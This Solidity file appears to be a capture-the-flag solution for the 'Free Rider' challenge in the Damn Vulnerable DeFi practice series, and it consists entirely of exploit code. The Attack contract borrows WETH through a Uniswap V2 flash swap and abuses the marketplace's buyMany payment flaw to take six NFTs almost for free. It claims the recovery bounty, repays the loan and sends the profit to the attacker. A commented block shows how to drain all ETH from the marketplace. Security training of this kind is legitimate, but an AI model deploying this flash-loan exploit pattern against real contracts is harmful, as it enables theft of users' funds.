// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";

contract Attack {
    WETH public immutable weth;
    IUniswapV2Pair public immutable uniswapPair;
    FreeRiderNFTMarketplace public immutable marketplace;
    DamnValuableNFT public immutable nft;
    FreeRiderRecoveryManager public immutable recoveryManager;

    constructor(WETH _weth, IUniswapV2Pair _uniswapPair, FreeRiderNFTMarketplace _marketplace, DamnValuableNFT _nft, FreeRiderRecoveryManager _recoveryManager) {
        weth = _weth;
        uniswapPair = _uniswapPair;
        marketplace = _marketplace;
        nft = _nft;
        recoveryManager = _recoveryManager;
    }

    function attack(uint256 _nftPrice) external {
        uniswapPair.swap(_nftPrice, 0, address(this), abi.encode(msg.sender));
    }

    error Balance(uint256, uint256);

    function uniswapV2Call(address, uint256 _amount0, uint256, bytes calldata _data) external {
        (address attacker) = abi.decode(_data, (address));

        uint256[] memory tokenIds = new uint256[](6);
        for (uint8 i = 0; i < tokenIds.length; i++) {
            tokenIds[i] = uint256(i);
        }

        weth.withdraw(_amount0);
        marketplace.buyMany{value: _amount0}(tokenIds);

        // Uncomment to steal all ETH from marketplace
        // tokenIds = new uint256[](2);
        // uint256[] memory prices = new uint256[](tokenIds.length);

        // for (uint8 i = 0; i < tokenIds.length; i++) {
        //     tokenIds[i] = uint256(i);
        //     prices[i] = _amount0;
        //     nft.approve(address(marketplace), i);
        // }

        // marketplace.offerMany(tokenIds, prices);
        // marketplace.buyMany{value: _amount0}(tokenIds);

        for (uint8 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), address(recoveryManager), i, abi.encode(attacker));
        }

        uint256 repayAmount = _amount0 * 1000 / 997 + 1;
        weth.deposit{value: repayAmount}();
        weth.transfer(msg.sender, repayAmount);

        payable(attacker).send(address(this).balance);
    }

    function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}